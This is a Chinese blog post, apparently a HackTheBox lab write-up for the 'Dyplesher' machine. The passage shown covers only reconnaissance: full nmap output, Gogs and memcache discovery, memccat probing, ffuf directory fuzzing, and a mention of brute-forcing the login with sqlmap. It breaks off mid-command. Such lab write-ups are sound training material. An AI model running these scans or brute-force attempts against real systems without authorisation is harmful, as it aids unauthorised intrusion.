<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Bantian">





<title>HackTheBox-Dyplesher靶机学习笔记 | Bantian</title>



    <link rel="icon" href="/my.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 4.2.1"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Archives</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Archives</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">HackTheBox-Dyplesher靶机学习笔记</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">2021-05-14&nbsp;&nbsp;18:35:28</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <blockquote>
<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/223355" target="_blank" rel="noopener">https://www.anquanke.com/post/id/223355</a></p>
</blockquote>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/0.png" alt="0"></p>
<p>本文主要是记录下对HackTheBox靶机Dyplesher的渗透过程，该靶机的难度评级为<code>Insane</code>，从这个靶机可以学习到memcache、MineCraft Maven插件制作以及AMQP协议相关的知识。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>namp收集目标主机信息：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Nmap 7.91 scan initiated Sat Oct 31 09:52:23 2020 as: nmap -sSVC -pn -oA nmap_full -v 10.10.10.190</span></span><br><span class="line">Nmap scan report for 10.10.10.190</span><br><span class="line">Host is up (0.0020s latency).</span><br><span class="line">Not shown: 65525 filtered ports</span><br><span class="line">PORT      STATE  SERVICE    VERSION</span><br><span class="line">22/tcp    open   ssh        OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|_  256 9f:b2:4c:5c:de:44:09:14:ce:4f:57:62:0b:f9:71:81 (ED25519)</span><br><span class="line">80/tcp    open   http       Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">3000/tcp  open   ppp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines, Help: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647</span><br><span class="line">|     Set-Cookie: i_like_gogs=cab4d447d0b05838; Path=/; HttpOnly</span><br><span class="line">|     Set-Cookie: _csrf=AWdLS2HY7sj9MGl_uzy9BIdiyCU6MTYwNDEzODA2Nzk5MDYzMzkwMA%3D%3D; Path=/; Expires=Sun, 01 Nov 2020 09:54:27 GMT; HttpOnly</span><br><span class="line">|     Date: Sat, 31 Oct 2020 09:54:27 GMT</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head data-suburl=""&gt;</span><br><span class="line">|     &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;</span><br><span class="line">|     &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"/&gt;</span><br><span class="line">|     &lt;meta name="author" content="Gogs" /&gt;</span><br><span class="line">|     &lt;meta name="description" content="Gogs is a painless self-hosted Git service" /&gt;</span><br><span class="line">|     &lt;meta name="keywords" content="go, git, self-hosted, gogs"&gt;</span><br><span class="line">|     &lt;meta name="referrer" content="no-referrer" /&gt;</span><br><span class="line">|     &lt;meta name="_csrf" content="AWdLS2HY7sj9MGl_uzy9BIdiyCU6MTYwNDEzODA2Nzk5MDYzMzkwMA==" /&gt;</span><br><span class="line">|     &lt;meta name="_suburl" content="" /&gt;</span><br><span class="line">|     &lt;meta proper</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647</span><br><span class="line">|     Set-Cookie: i_like_gogs=cb192a56afa1412c; Path=/; HttpOnly</span><br><span class="line">|     Set-Cookie: _csrf=WNCCxXx-RAstuqnsdyse0s19mWI6MTYwNDEzODA3MzA3NjcyNTg4Nw%3D%3D; Path=/; Expires=Sun, 01 Nov 2020 09:54:33 GMT; HttpOnly</span><br><span class="line">|     Date: Sat, 31 Oct 2020 09:54:33 GMT</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head data-suburl=""&gt;</span><br><span class="line">|     &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;</span><br><span class="line">|     &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"/&gt;</span><br><span class="line">|     &lt;meta name="author" content="Gogs" /&gt;</span><br><span class="line">|     &lt;meta name="description" content="Gogs is a painless self-hosted Git service" /&gt;</span><br><span class="line">|     &lt;meta name="keywords" content="go, git, self-hosted, gogs"&gt;</span><br><span class="line">|     &lt;meta name="referrer" content="no-referrer" /&gt;</span><br><span class="line">|     &lt;meta name="_csrf" content="WNCCxXx-RAstuqnsdyse0s19mWI6MTYwNDEzODA3MzA3NjcyNTg4Nw==" /&gt;</span><br><span class="line">|     &lt;meta name="_suburl" content="" /&gt;</span><br><span class="line">|_    &lt;meta</span><br><span class="line">4369/tcp  open   epmd       Erlang Port Mapper Daemon</span><br><span class="line">|_epmd-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">5672/tcp  open   amqp       Advanced Message Queue Protocol</span><br><span class="line">|_amqp-info: Unable to open connection: TIMEOUT</span><br><span class="line">11211/tcp open   memcache?</span><br><span class="line">25562/tcp open   unknown</span><br><span class="line">25565/tcp open   minecraft?</span><br><span class="line">25572/tcp closed unknown</span><br><span class="line">25672/tcp open   unknown</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3000-TCP:V=7.91%I=7%D=10/31%Time=5F9D3452%P=x86_64-pc-linux-gnu%r(G</span><br><span class="line">SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20</span><br><span class="line">SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\</span><br><span class="line">SF:x20Request")%r(GetRequest,2063,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:</span><br><span class="line">SF:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/</span><br><span class="line">SF:;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gogs=cab4d447d0b05838;</span><br><span class="line">SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=AWdLS2HY7sj9MGl_uzy9BId</span><br><span class="line">SF:iyCU6MTYwNDEzODA2Nzk5MDYzMzkwMA%3D%3D;\x20Path=/;\x20Expires=Sun,\x2001</span><br><span class="line">SF:\x20Nov\x202020\x2009:54:27\x20GMT;\x20HttpOnly\r\nDate:\x20Sat,\x2031\</span><br><span class="line">SF:x20Oct\x202020\x2009:54:27\x20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html&gt;\n&lt;h</span><br><span class="line">SF:ead\x20data-suburl=\"\"&gt;\n\t&lt;meta\x20http-equiv=\"Content-Type\"\x20con</span><br><span class="line">SF:tent=\"text/html;\x20charset=UTF-8\"\x20/&gt;\n\t&lt;meta\x20http-equiv=\"X-U</span><br><span class="line">SF:A-Compatible\"\x20content=\"IE=edge\"/&gt;\n\t\n\t\t&lt;meta\x20name=\"author</span><br><span class="line">SF:\"\x20content=\"Gogs\"\x20/&gt;\n\t\t&lt;meta\x20name=\"description\"\x20cont</span><br><span class="line">SF:ent=\"Gogs\x20is\x20a\x20painless\x20self-hosted\x20Git\x20service\"\x2</span><br><span class="line">SF:0/&gt;\n\t\t&lt;meta\x20name=\"keywords\"\x20content=\"go,\x20git,\x20self-ho</span><br><span class="line">SF:sted,\x20gogs\"&gt;\n\t\n\t&lt;meta\x20name=\"referrer\"\x20content=\"no-refe</span><br><span class="line">SF:rrer\"\x20/&gt;\n\t&lt;meta\x20name=\"_csrf\"\x20content=\"AWdLS2HY7sj9MGl_uz</span><br><span class="line">SF:y9BIdiyCU6MTYwNDEzODA2Nzk5MDYzMzkwMA==\"\x20/&gt;\n\t&lt;meta\x20name=\"_subu</span><br><span class="line">SF:rl\"\x20content=\"\"\x20/&gt;\n\t\n\t\n\t\n\t\t&lt;meta\x20proper")%r(Help,67</span><br><span class="line">SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2</span><br><span class="line">SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r</span><br><span class="line">SF:(HTTPOptions,189F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nContent-Type:\x2</span><br><span class="line">SF:0text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;\x</span><br><span class="line">SF:20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gogs=cb192a56afa1412c;\x2</span><br><span class="line">SF:0Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=WNCCxXx-RAstuqnsdyse0s19mW</span><br><span class="line">SF:I6MTYwNDEzODA3MzA3NjcyNTg4Nw%3D%3D;\x20Path=/;\x20Expires=Sun,\x2001\x2</span><br><span class="line">SF:0Nov\x202020\x2009:54:33\x20GMT;\x20HttpOnly\r\nDate:\x20Sat,\x2031\x20</span><br><span class="line">SF:Oct\x202020\x2009:54:33\x20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html&gt;\n&lt;head</span><br><span class="line">SF:\x20data-suburl=\"\"&gt;\n\t&lt;meta\x20http-equiv=\"Content-Type\"\x20conten</span><br><span class="line">SF:t=\"text/html;\x20charset=UTF-8\"\x20/&gt;\n\t&lt;meta\x20http-equiv=\"X-UA-C</span><br><span class="line">SF:ompatible\"\x20content=\"IE=edge\"/&gt;\n\t\n\t\t&lt;meta\x20name=\"author\"\</span><br><span class="line">SF:x20content=\"Gogs\"\x20/&gt;\n\t\t&lt;meta\x20name=\"description\"\x20content</span><br><span class="line">SF:=\"Gogs\x20is\x20a\x20painless\x20self-hosted\x20Git\x20service\"\x20/&gt;</span><br><span class="line">SF:\n\t\t&lt;meta\x20name=\"keywords\"\x20content=\"go,\x20git,\x20self-hoste</span><br><span class="line">SF:d,\x20gogs\"&gt;\n\t\n\t&lt;meta\x20name=\"referrer\"\x20content=\"no-referre</span><br><span class="line">SF:r\"\x20/&gt;\n\t&lt;meta\x20name=\"_csrf\"\x20content=\"WNCCxXx-RAstuqnsdyse0</span><br><span class="line">SF:s19mWI6MTYwNDEzODA3MzA3NjcyNTg4Nw==\"\x20/&gt;\n\t&lt;meta\x20name=\"_suburl\</span><br><span class="line">SF:"\x20content=\"\"\x20/&gt;\n\t\n\t\n\t\n\t\t&lt;meta");</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="meta">#</span><span class="bash"> Nmap <span class="keyword">done</span> at Sat Oct 31 09:57:04 2020 -- 1 IP address (1 host up) scanned <span class="keyword">in</span> 281.27 seconds</span></span><br></pre></td></tr></table></figure>

<p>由nmap扫描可知，目前开放的端口为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">22&#x2F;tcp    open   ssh</span><br><span class="line">80&#x2F;tcp    open   http</span><br><span class="line">3000&#x2F;tcp  open   ppp?</span><br><span class="line">4369&#x2F;tcp  open   epmd</span><br><span class="line">5672&#x2F;tcp  open   amqp</span><br><span class="line">11211&#x2F;tcp open   memcache?</span><br><span class="line">25562&#x2F;tcp open   unknown</span><br><span class="line">25565&#x2F;tcp open   minecraft?</span><br><span class="line">25572&#x2F;tcp closed unknown</span><br><span class="line">25672&#x2F;tcp open   unknown</span><br></pre></td></tr></table></figure>

<p>首先访问目标主机的web服务页面 <a href="http://10.10.10.190" target="_blank" rel="noopener">http://10.10.10.190</a> ，在Apache上托管着Minecraft Server，并且提示对应的域名是<code>test.dyplesher.htb</code>:</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/1.png" alt="1"></p>
<p>将hostname添加到<code>/etc/hosts</code>文件中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.190	dyplesher.htb test.dyplesher.htb</span><br></pre></td></tr></table></figure>

<p>访问<a href="http://test.dyplesher.htb" target="_blank" rel="noopener">http://test.dyplesher.htb</a> ：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/7.png" alt="7"></p>
<p>是一个memcache相关的界面，看来网站使用了memcache进行优化。</p>
<p>回到 <a href="http://dyplesher.htb" target="_blank" rel="noopener">http://dyplesher.htb</a> ，点击上面的链接，发现只有3个活链接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;twitter.com&#x2F;_felamos</span><br><span class="line">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;hCKmBmJdpho</span><br><span class="line">http:&#x2F;&#x2F;10.10.10.190&#x2F;staff</span><br></pre></td></tr></table></figure>

<p>访问staff页面，有三个用户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MinatoTW, owner</span><br><span class="line">felamos, dev</span><br><span class="line">yuntao, admin</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/2.png" alt="2"></p>
<p>这三个用户的头像下都有一个齿轮icon，对应三个链接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dyplesher.htb:8080&#x2F;arrexel</span><br><span class="line">http:&#x2F;&#x2F;dyplesher.htb:8080&#x2F;felamos</span><br><span class="line">http:&#x2F;&#x2F;dyplesher.htb:8080&#x2F;yuntao</span><br></pre></td></tr></table></figure>

<p>这个齿轮，如果我们利用图片搜索去查询的话，会发现这是名为gogs的git服务：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/4.png" alt="4"></p>
<p>与gogs相关的信息在nmap的扫描结果中也有出现过，对应的端口是3000：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/3.png" alt="3"></p>
<p>所以上面的3个真实链接应该是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dyplesher.htb:3000&#x2F;arrexel</span><br><span class="line">http:&#x2F;&#x2F;dyplesher.htb:3000&#x2F;felamos</span><br><span class="line">http:&#x2F;&#x2F;dyplesher.htb:3000&#x2F;yuntao</span><br></pre></td></tr></table></figure>

<p>访问之后并没有什么公开的信息：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/6.png" alt="6"></p>
<p>gogs上既然提供了注册登录功能，所以注册一个账号test然后登录，在<code>Explore -&gt; Users</code>这里也看到了3个用户以及他们的注册邮箱，除此之外也没有什么新发现：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/8.png" alt="8"></p>
<h3 id="MemCache服务"><a href="#MemCache服务" class="headerlink" title="MemCache服务"></a>MemCache服务</h3><p>再看<a href="http://test.dyplesher.htb" target="_blank" rel="noopener">http://test.dyplesher.htb</a> 页面，也就是前面发现的memcache服务，什么是memcache呢？MemCache是一个高性能、分布式的内存对象缓存系统，它通过在内存中缓存数据和对象来减少读取数据库的次数，从而提高网站的访问速度。</p>
<p>这个页面接收两个参数，如果值相等，返回200 response：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/9.png" alt="9"></p>
<p>如果不同，则返回500：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/10.png" alt="10"></p>
<p>利用memcache工具，我们可以枚举存储在memcache数据库中的键值对：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libmemcached-tools</span><br></pre></td></tr></table></figure>

<p>然后尝试用<code>memccat</code>去访问key <code>aaa</code>的值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─# memccat --server&#x3D;10.10.10.190 aaa</span><br><span class="line">error on aaa(NOT FOUND)</span><br></pre></td></tr></table></figure>

<p>这种方式行不通，有可能是因为memcache开启了某种验证机制，比如<code>Simple Authentication and Security Layer (SASL)</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists </span><br><span class="line">╰─# ffuf -u http:&#x2F;&#x2F;dyplesher.htb&#x2F;FUZZ -w &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">        &#x2F;&#39;___\  &#x2F;&#39;___\           &#x2F;&#39;___\       </span><br><span class="line">       &#x2F;\ \__&#x2F; &#x2F;\ \__&#x2F;  __  __  &#x2F;\ \__&#x2F;       </span><br><span class="line">       \ \ ,__\\ \ ,__\&#x2F;\ \&#x2F;\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_&#x2F; \ \ \_&#x2F;\ \ \_\ \ \ \ \_&#x2F;      </span><br><span class="line">         \ \_\   \ \_\  \ \____&#x2F;  \ \_\       </span><br><span class="line">          \&#x2F;_&#x2F;    \&#x2F;_&#x2F;   \&#x2F;___&#x2F;    \&#x2F;_&#x2F;       </span><br><span class="line"></span><br><span class="line">       v1.0.2</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http:&#x2F;&#x2F;dyplesher.htb&#x2F;FUZZ</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">                        [Status: 200, Size: 4242, Words: 1281, Lines: 124]</span><br><span class="line">.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]</span><br><span class="line">.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]</span><br><span class="line">.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]</span><br><span class="line">cgi-bin&#x2F;                [Status: 301, Size: 315, Words: 20, Lines: 10]</span><br><span class="line">css                     [Status: 301, Size: 312, Words: 20, Lines: 10]</span><br><span class="line">favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1]</span><br><span class="line">fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10]</span><br><span class="line">home                    [Status: 302, Size: 350, Words: 60, Lines: 12]</span><br><span class="line">img                     [Status: 301, Size: 312, Words: 20, Lines: 10]</span><br><span class="line">index.php               [Status: 200, Size: 4252, Words: 1281, Lines: 124]</span><br><span class="line">js                      [Status: 301, Size: 311, Words: 20, Lines: 10]</span><br><span class="line">login                   [Status: 200, Size: 4188, Words: 1222, Lines: 84]</span><br><span class="line">register                [Status: 302, Size: 350, Words: 60, Lines: 12]</span><br><span class="line">robots.txt              [Status: 200, Size: 24, Words: 2, Lines: 3]</span><br><span class="line">server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]</span><br><span class="line">staff                   [Status: 200, Size: 4389, Words: 1534, Lines: 103]</span><br><span class="line">:: Progress: [4614&#x2F;4614] :: Job [1&#x2F;1] :: 135 req&#x2F;sec :: Duration: [0:00:34] :: Errors: 0 ::</span><br></pre></td></tr></table></figure>

<p>除了<code>/staff</code>之外，发现了其他隐藏的链接<code>/home</code>、<code>login</code>和<code>/register</code>，访问这些页面最后都会重定向到<code>/login</code>页面：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/11.png" alt="11"></p>
<p>用密码字典和sqlmap进行爆破失败后，接着用<code>ffuf</code>扫描<code>test.dyplesher.htb</code>站点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists </span><br><span class="line">╰─# 